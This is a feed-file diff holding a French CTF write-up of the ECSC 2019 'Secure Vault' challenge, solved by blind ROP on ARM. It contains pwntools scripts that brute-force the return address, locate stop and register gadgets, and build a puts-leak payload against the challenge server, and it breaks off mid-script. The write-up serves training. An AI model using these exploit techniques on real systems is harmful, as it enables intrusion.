@@ -1,0 +1,702 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Daily Security - L'actualité commentée</title><link href="https://test.dailysecurity.fr/" rel="alternate"></link><link href="https://test.dailysecurity.fr/feeds/lactualite-commentee.atom.xml" rel="self"></link><id>https://test.dailysecurity.fr/</id><updated>2019-05-22T18:00:00+02:00</updated><entry><title>Blind ROP ARM - ECSC Préquals 2019 - Secure Vault - Writeup</title><link href="https://test.dailysecurity.fr/blind-rop-arm-securevault-writeup" rel="alternate"></link><published>2019-05-22T18:00:00+02:00</published><updated>2019-05-22T18:00:00+02:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2019-05-22:/blind-rop-arm-securevault-writeup</id><summary type="html">&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/intro-brop.png" style="width: 60%;" alt="intro"&gt;&lt;/p&gt;
+&lt;p&gt;Dans le cadre des préqualifications de l'ECSC, j'ai eu l'occasion de tester un challenge original dans la catégorie pwn : le challenge Secure Vault.&lt;/p&gt;
+&lt;p&gt;La mention "aucun binaire n'est fourni avec ce challenge" nous indique que le challenge va être intéressant !&lt;/p&gt;
+&lt;p&gt;Pour commencer, on se connecte au challenge :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@Miaou:/# nc …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/intro-brop.png" style="width: 60%;" alt="intro"&gt;&lt;/p&gt;
+&lt;p&gt;Dans le cadre des préqualifications de l'ECSC, j'ai eu l'occasion de tester un challenge original dans la catégorie pwn : le challenge Secure Vault.&lt;/p&gt;
+&lt;p&gt;La mention "aucun binaire n'est fourni avec ce challenge" nous indique que le challenge va être intéressant !&lt;/p&gt;
+&lt;p&gt;Pour commencer, on se connecte au challenge :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@Miaou:/# nc challenges.ecsc-teamfrance.fr &lt;span class="m"&gt;4006&lt;/span&gt;
+Welcome. Please enter your password:
+miaou
+Wrong password. Bye.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le binaire a l'air simple, on nous demande un mot de passe : s'il est faux, il affiche "Wrong password" et se ferme.&lt;/p&gt;
+&lt;p&gt;On essaie donc d'overflow la seule entrée disponible :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@Miaou:/# nc challenges.ecsc-teamfrance.fr &lt;span class="m"&gt;4006&lt;/span&gt; &amp;lt; &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print &amp;#39;a&amp;#39;*80&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+Welcome. Please enter your password:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pas de retour, le binaire a planté !&lt;/p&gt;
+&lt;p&gt;Nous n'avons pas le binaire, nous allons donc devoir l'exploiter en blind (BROP ARM FTW).&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Hypothèse : Les challenges précédents étaient en ARM, on peut donc supposer que celui-ci sera en ARM aussi.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;On commence par faire un bruteforce byte à byte pour obtenir le canary/ebp/eip ou PC.&lt;/p&gt;
+&lt;p&gt;Méthode sur &lt;a href="https://www.dailysecurity.fr/la-stack-smashing-protection/"&gt;mon  article&lt;/a&gt; sur le stack canary :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+&lt;span class="n"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;challenges.ecsc-teamfrance.fr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;hex_byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;hex_byte&lt;/span&gt;
+            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;dumb&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Bye&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="n"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;hex_byte&lt;/span&gt;
+                &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[*] byte : &lt;/span&gt;&lt;span class="si"&gt;%r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;hex_byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+                &lt;span class="k"&gt;break&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+                &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hum :(&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="k"&gt;pass&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;leak&lt;/span&gt;
+&lt;span class="c1"&gt;#Note : CTRL+C quand ça bloque&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Condition vraie : "Bye" ;&lt;/li&gt;
+&lt;li&gt;Condition fausse : pas de retour.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Suite à ce bruteforce, on obtient seulement 4 bytes : une adresse 0x10634.&lt;/p&gt;
+&lt;p&gt;On peut en déduire trois choses : &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;C'est bien de l'ARM ;&lt;/li&gt;
+&lt;li&gt;Il n'y a pas de canary (youhou, ça aurait été pénible comme ça redémarre à chaque fois) ;&lt;/li&gt;
+&lt;li&gt;Pas de PIE, la valeur ne change pas, de plus elle est adressée sur les adresses ARM habituelles.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Méthodologie&lt;/h2&gt;
+&lt;p&gt;A partir de là, on va tenter le schéma classique de BROP :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On cherche un stop gadget (gadget qui renvoie une chaine différente ou qui fait attendre le programme) ;&lt;/li&gt;
+&lt;li&gt;On cherche un gadget pour load nos registres ;&lt;/li&gt;
+&lt;li&gt;On cherche la PLT de &lt;em&gt;puts&lt;/em&gt; (il n'y pas de format utilisé dans le binaire donc &lt;em&gt;printf&lt;/em&gt; est optimisée en &lt;em&gt;puts&lt;/em&gt; par le binaire) pour leak le binaire ;&lt;/li&gt;
+&lt;li&gt;On leak la libc à partir des adresses de la GOT ;&lt;/li&gt;
+&lt;li&gt;On calcule l'offset entre &lt;em&gt;puts&lt;/em&gt; et &lt;em&gt;system&lt;/em&gt; (et &lt;em&gt;/bin/sh&lt;/em&gt;) ;&lt;/li&gt;
+&lt;li&gt;On fait un ret2libc classique.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Stop gadget&lt;/h2&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/safe.gif" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;Le stop gadget se trouve facilement. On bruteforce autour de notre PC actuel et on trouve une chaine qui renvoie "Welcome back" à 0x1065c.&lt;/p&gt;
+&lt;p&gt;Ce sera notre stop gadget : si on reçoit cette chaine, on sait qu'on a bien jump sur 0x1065c.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x400&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;challenges.ecsc-teamfrance.fr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x10634&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Gadget pour contrôler les registres&lt;/h2&gt;
+&lt;p&gt;Maintenant, le gadget pour les registres.&lt;/p&gt;
+&lt;p&gt;En ARM, il y a un gadget très connu, qui fait :
+&lt;code&gt;LDMFD SP! {R4-R10,LR};BX LR&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Autrement dit, il va pop nos valeurs de la stack dans les registres R4,R5,R6,R7,R8,R9,R10 et LR puis jump sur LR.&lt;/p&gt;
+&lt;p&gt;Avec ce gadget, on contrôle R4 jusqu'à R10.&lt;/p&gt;
+&lt;p&gt;Ce gadget se situe dans la &lt;em&gt;__libc_csu_init&lt;/em&gt; (juste après le main). Il sera toujours présent dans nos binaires.&lt;/p&gt;
+&lt;p&gt;Pour en être sûr, on prend le binaire d'un autre challenge du même CTF : &lt;em&gt;armory&lt;/em&gt; et on obtient :
+&lt;img alt="gadget 1" src="https://www.dailysecurity.fr/images/gad1.png"&gt;&lt;/p&gt;
+&lt;p&gt;On y trouve aussi deux autres gadgets intéressants, un gadget pour contrôler R0, R1 et R2 suivi d'un jump sur r3 (toujours dans &lt;em&gt;__libc_csu_init&lt;/em&gt;) à l'adresse 0x10610 :
+&lt;img alt="gadget 2" src="https://www.dailysecurity.fr/images/gad2.png"&gt;
+Ainsi qu'un dans .term_proc pour contrôler r3 (situé de façon relative à &lt;em&gt;__libc_csu_init&lt;/em&gt; (l'offset ne change pas)) à l'adresse 0x10644 :
+&lt;img alt="gadget 3" src="https://www.dailysecurity.fr/images/gad3.png"&gt;
+Avec ces trois gadgets, on contrôle tous nos registres et on peut jump où on veut.&lt;/p&gt;
+&lt;p&gt;Bien sur, dans le challenge, l'adresse ne sera pas la même, il faudra utiliser le stop gadget pour trouver la bonne adresse.&lt;/p&gt;
+&lt;p&gt;Il suffit juste de faire une boucle qui prend en compte le pop de 7 registres (R4-R10) :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x400&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;challenges.ecsc-teamfrance.fr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x10600&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1065c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="n"&gt;dump&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Welcome back&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
+            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Dès que le binaire nous renvoie "Welcome back", on sait qu'on a atteint le gadget qui nous intéresse.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Opening&lt;/span&gt; &lt;span class="n"&gt;connection&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;challenges&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ecsc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;teamfrance&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fr&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Done&lt;/span&gt;
+&lt;span class="mi"&gt;812&lt;/span&gt;
+&lt;span class="n"&gt;Welcome&lt;/span&gt; &lt;span class="n"&gt;back&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/iloveit.gif" alt="i like it" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;A partir de là, c'est déjà le game over. On contrôle tous nos registres, on cherche &lt;em&gt;puts&lt;/em&gt; avec un r0 égal à une adresse valide (j'ai pris l'adresse du gadget LDMFD SP! {R4-R10,LR} récupérée au tout début) et on applique la même méthode.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;challenges.ecsc-teamfrance.fr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4006&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;
+        &lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+        &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x10604&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1092c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x1c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="n"&gt;yolo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf0&lt;/span&gt;&lt;span class="s2"&gt;G&lt;/span&gt;&lt;span class="se"&gt;\xbd\xe8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
